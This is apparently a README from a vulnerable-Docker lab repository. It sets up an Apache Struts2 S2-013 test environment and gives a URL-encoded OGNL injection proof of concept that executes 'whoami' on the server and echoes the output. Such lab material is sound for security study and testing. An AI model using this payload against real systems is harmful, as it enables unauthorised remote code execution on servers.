### s2-013 vuldocker

## 测试环境搭建

```
docker-compose build
docker-compose up -d

安全完之后直接访问http://0.0.0.0:30080
```

```
poc:
%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('whoami').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D

```

![1.png](https://raw.githubusercontent.com/Loneyers/vuldocker/master/struts2/s2-013/1.png)

